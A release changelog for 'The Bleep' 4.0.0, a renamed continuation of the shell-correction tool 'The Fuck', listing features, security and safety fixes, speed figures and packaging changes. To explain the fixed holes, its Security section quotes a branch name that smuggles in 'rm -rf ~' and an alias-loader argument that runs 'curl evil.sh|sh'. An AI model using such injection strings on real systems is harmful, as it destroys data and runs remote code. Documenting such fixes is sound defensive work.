# Changelog

## 4.0.0 — unreleased

The first release of *The Bleep*, and the first release of this codebase since
*The Fuck* 3.32 in January 2022. The version continues *The Fuck*'s numbering
rather than restarting it, because this is the same codebase carried forward.

### New

- **Press tab to edit a correction instead of running it.** A suggestion is
  often ninety-five percent right, and the last five percent used to mean
  retyping it. `tab` at the confirmation prompt hands it to your shell's line
  editor with the cursor at the end; nothing runs until you press return. Zsh
  and Fish put it in the next prompt (`print -z`, `commandline --replace`),
  bash reopens it in readline (`read -e -i`), PowerShell makes it the newest
  history entry for `↑`. No `TIOCSTI`, no synthesised keystrokes: where a shell
  has no supported way to do it, the offer is not made. `--edit` makes it the
  behaviour of return for one run and `edit = True` makes it permanent.
  (based on [#1063](https://github.com/nvbn/thefuck/pull/1063),
  [#1104](https://github.com/nvbn/thefuck/pull/1104),
  [#1186](https://github.com/nvbn/thefuck/pull/1186))
- **`--shell` says which shell you are in**, for the places where working it
  out from the process tree gets it wrong: containers, IDE terminals, wrapper
  scripts, `distrobox`. An unknown name is an error listing the known ones
  rather than a silent fallback to the generic shell, and naming the shell
  skips the walk up the process tree instead of adding to it.
  ([#1538](https://github.com/nvbn/thefuck/pull/1538))

### It runs on current Python

- `distutils` is gone, which is what stopped *The Fuck* from starting on Python
  3.12 at all, and `pkg_resources` and `imp` went with it.
  ([#1499](https://github.com/nvbn/thefuck/issues/1499),
  [#1610](https://github.com/nvbn/thefuck/issues/1610),
  [#1552](https://github.com/nvbn/thefuck/issues/1552))
- Python 2 support removed.
  ([#1479](https://github.com/nvbn/thefuck/issues/1479),
  [#873](https://github.com/nvbn/thefuck/issues/873))
- Tested on Python 3.9 through 3.14, on Linux, macOS and Windows.

### Security

- The `sudo` rule no longer hands a re-quoted script to `sh -c` as root, where
  quoted data could be re-read as code.
- Filenames, branch names and URLs that rules read out of a failed command's
  own output are quoted before being put back into a command.
  (both [#1606](https://github.com/nvbn/thefuck/issues/1606))
- `open_command` quotes the URL it passes to the shell.
  ([#1531](https://github.com/nvbn/thefuck/issues/1531))
- **Names that come from somewhere else are quoted.** A correction is text your
  shell then evaluates, and much of that text is copied out of a place you do
  not control. git accepts a branch called `feature;rm -rf ~`, npm accepts a
  script called the same, and a Gruntfile task name is any string at all. With a
  repository carrying such a branch, a mistyped `git checkout` offered
  `git checkout feature;rm -rf ~` as its first suggestion. Quoted now in the
  helper behind two dozen rules and in the six that build their own suggestions.
- **The command being run again no longer inherits your shell's state.** Reading
  what your last command printed means running it again, and the environment it
  was handed included everything the alias had just put there — `TB_HISTORY` is
  your last ten commands and `TB_SHELL_ALIASES` is your alias list. A mistyped
  program name that happened to exist got both.
- **`GIT_TRACE=1` is set for git and for nothing else.** It was in the default
  environment for every command that got run again.
- **The alias name is checked before it is written into shell code.**
  `thebleep --alias-loader 'x; curl evil.sh|sh; f' >> ~/.bashrc` used to write a
  line that ran that at every shell startup.

### Safety

- **The previous command is no longer run again without asking.** Correcting a
  command means knowing what it printed, and a shell keeps no record, so the
  command was run a second time — before any correction had been offered or
  agreed to. It is now confirmed first, unless there is no such program to run
  or the program is one that only ever reads. `confirm_replay = False` restores
  the old behaviour.
  ([#1126](https://github.com/nvbn/thefuck/issues/1126))
- **What you agree to is what runs.** Six rules did more than they said, and
  now do only what they say:
  - `dirty_untar` and `dirty_unzip` deleted every file named in the archive
    after you accepted extracting it into a directory of its own. They could not
    tell an extracted file from one of yours under the same name, so a README in
    the archive meant yours was overwritten and then deleted; and the check
    meant to keep them inside the current directory was a string prefix test, so
    an archive member called `../foobar/precious` walked out of it. They leave
    the files alone.
  - `ssh_known_hosts` returned your own command unchanged and deleted the
    offending `known_hosts` line behind it, so a man-in-the-middle warning
    disappeared with nothing to read. It now suggests the `ssh-keygen -R` that
    ssh itself prints, in front of your command, with the file and host quoted.
    On the DNS-spoofing warning it used to delete the entry that was *correct*
    as well.
  - `rm_dir` adds `-r`, not `-rf`.
  - `pip_install` no longer falls back to `sudo pip install`.
  - `python_module_error` is off by default: an import name is not a
    distribution name, so the package it offers to install is a guess, and a
    mistyped import makes it `pip install <typo>`.
  - `quotation_marks` only fires when your command genuinely does not parse.
- **The list of commands that only read is shorter.** `uniq` takes an output
  file as its second operand, `file -C` writes a compiled magic file,
  `info --output` writes the page out, `less` runs whatever `LESSOPEN` names,
  and `man` writes into the cat page cache. Those, and the other pagers, are off
  it.
- **Suggestions come out in the same order every time.** Deduplication went
  through a set, and a set of corrections iterates by the hash of a string,
  which Python randomises per process — so with several suggestions at the same
  priority, which one the down arrow gave you was different on every run.

### Speed

Measured against *The Fuck* 3.32 on the same machine and the same Python 3.11,
median of 30 runs; the harness and the recorded run are in `bench/`.

- Opening a shell: 218 ms → 28 ms, or to 0.07 ms with `--alias-loader`, which
  defines the alias on first use so shell startup runs no Python at all.
- Correcting a mistyped command: 247 ms → 53 ms.
- Correcting after a command printed a megabyte: 3257 ms → 115 ms. This one is
  a correctness fix as much as a speed one: output used to be read only after
  the command exited, which deadlocks once the output fills the pipe buffer, so
  anything printing more than about 64 KB produced nothing to correct from.
- Rules are compiled once into a cache, and a command is only dispatched to the
  rules that could match it — 28 of 170 rather than all of them.
- A rule that looked for twenty-eight different messages lowercased the whole
  output once per message. On a megabyte that was 66 ms; it is 4.6 ms.
- On Windows, where *The Fuck* has long been called slow, a correction takes
  308 ms where *The Fuck* takes 876 ms — measured on a real Windows 10 machine
  with Defender live and nothing excluded. Windows charges for opening files,
  so what decides it is how many modules each tool opens: 109 against 424.
  A correction now imports 42 modules beyond a bare interpreter rather than 81;
  `ast`, `pickle`, `socket`, `uuid`, `tempfile`, `shutil`, `subprocess`,
  `difflib` and `colorama` are loaded only where they are used, and `which` and
  `ShellConfiguration` no longer pull in `shutil` and `collections` to do what
  they do.
- `python -m thebleep` runs the same entry point as the `thebleep` command, for
  environments whose scripts directory is not on `PATH`.

### Rules

Refreshed against what the tools print today, found by running them rather than
by reading their old fixtures: `npm` 7+, `cargo` 1.73+, `docker` 25+, `brew` 4,
`gem` 3.2+, `az`, `gradle` 8, `terraform` 1.x, and `git` for `main` rather than
`master`. ([#1320](https://github.com/nvbn/thefuck/issues/1320),
[#1341](https://github.com/nvbn/thefuck/issues/1341),
[#1313](https://github.com/nvbn/thefuck/issues/1313))

- New rule `git_dubious_ownership`, for git refusing a repository it thinks
  somebody else owns.
  ([#1376](https://github.com/nvbn/thefuck/issues/1376))
- `brew install` no longer offers to install something when a `brew uninstall`
  failed, which it did because `install` is a substring of `uninstall`.
- Environment assignments are looked past when identifying a command, so
  `FOO=bar git brnch` is corrected.
  ([#1172](https://github.com/nvbn/thefuck/issues/1172))

### Fixed

- Crash walking an unreadable process tree, and on a process that exits while
  being killed. ([#1600](https://github.com/nvbn/thefuck/issues/1600),
  [#1509](https://github.com/nvbn/thefuck/issues/1509),
  [#1026](https://github.com/nvbn/thefuck/issues/1026),
  [#1040](https://github.com/nvbn/thefuck/issues/1040))
- Works with no terminal attached, and exits quietly on a closed pipe.
  ([#1562](https://github.com/nvbn/thefuck/issues/1562),
  [#1539](https://github.com/nvbn/thefuck/issues/1539))
- Works under `bash`/`zsh` with `set -u`, and with an empty alias value.
  ([#1355](https://github.com/nvbn/thefuck/issues/1355),
  [#1551](https://github.com/nvbn/thefuck/issues/1551))
- Fish history is read from the XDG data directory.
  ([#1258](https://github.com/nvbn/thefuck/issues/1258))
- Commands on Windows are found when the file is not spelled as typed.
  ([#1209](https://github.com/nvbn/thefuck/issues/1209),
  [#1296](https://github.com/nvbn/thefuck/issues/1296))
- The environment is no longer printed into debug output.
  ([#995](https://github.com/nvbn/thefuck/issues/995))
- The selection can be abandoned with the escape key.
  ([#1506](https://github.com/nvbn/thefuck/issues/1506))
- A correction is not applied when nobody confirmed it, which is what happened
  in a pipe, a subprocess or CI. Pass `--yes` to apply without asking.
- **The alias no longer breaks because of something you pasted.** Your recent
  history was passed in an environment variable, and the kernel will not hand a
  program one larger than 128K, so one pasted command that size made the alias
  fail with "Argument list too long" until the entry fell out of the window.
  ([#798](https://github.com/nvbn/thefuck/issues/798))
- **PowerShell.** A chained correction ran only its first half: `(a) -and (b)`
  tests whether `a` *printed* something rather than whether it worked, so
  `git add . && git commit` skipped the commit. Arguments were quoted the POSIX
  way, which PowerShell splits into several. A correction beginning with `echo`
  was silently discarded, so correcting `ehco test` did nothing. `TB_SHELL` was
  left in the session environment and `TB_ALIAS` was never set. The correction
  loop now runs in real Windows PowerShell 5.1 and 7 in CI.
- **A rule that fails is that rule's problem.** One that matched and then raised
  while working out its suggestion took the whole correction down with a
  traceback, losing every other rule's suggestions. Six rules that raised on a
  bare `git`, `go`, `composer` or `touch` were fixed too, and a file in your
  rules directory that is not a rule no longer stops corrections entirely.
- **One setting that cannot be understood costs one setting.** A single
  unparseable environment variable silently discarded every other one, so an
  `exclude_rules` you had set quietly came back. Values are checked, too:
  `THEBLEEP_DEBUG=1` used to mean no.
- **Only commands you could actually run are suggested.** Every file in a
  directory on `PATH` counted, so a README was offered as a command and a
  non-executable `realthinh` came back ahead of the `realthing` beside it. On
  Windows, `PATHEXT` decides.
- **A damaged rule cache cannot change which corrections exist.** A corrupt
  entry used to make that rule disappear; it falls back to the rule's source.
- Bash's first-run advice named `~/.bashrc` even when you only have
  `~/.bash_profile`.

### Packaging

- One wheel, the same everywhere. `setup.py` chose its entry points and its
  scripts by looking at `sys.platform` while the package was being *built*,
  which decides nothing useful for a `py3-none-any` wheel: the artifact a Windows
  user would have installed carried the POSIX entry points and none of the
  Windows ones.
- `decorator` and `win_unicode_console` are no longer dependencies, and
  `colorama` is only a dependency on Windows.
- Publishing happens in CI, from a version tag, over PyPI trusted publishing:
  the artifacts are built once, installed and exercised on Linux, macOS and
  Windows, and those exact files are what gets uploaded. There is no API token.
- `snapcraft.yaml` is gone. It used a syntax snapcraft removed years ago, so it
  could not have built, and nothing published it.
- The `bleep.bat` and `bleep.ps1` scripts are gone with it. `cmd.exe` was never
  a supported shell, and a `bleep.exe` from the entry point takes precedence
  over a `.bat` anyway.

### Renamed from The Fuck

The command is `thebleep`, the alias it installs is `bleep`, settings live in
`$XDG_CONFIG_HOME/thebleep/`, and environment variables are `THEBLEEP_*`. See
[Coming from The Fuck](README.md#coming-from-the-fuck) — the settings file
copies over unchanged, and `thebleep --alias-loader fuck` keeps the word you
are used to.
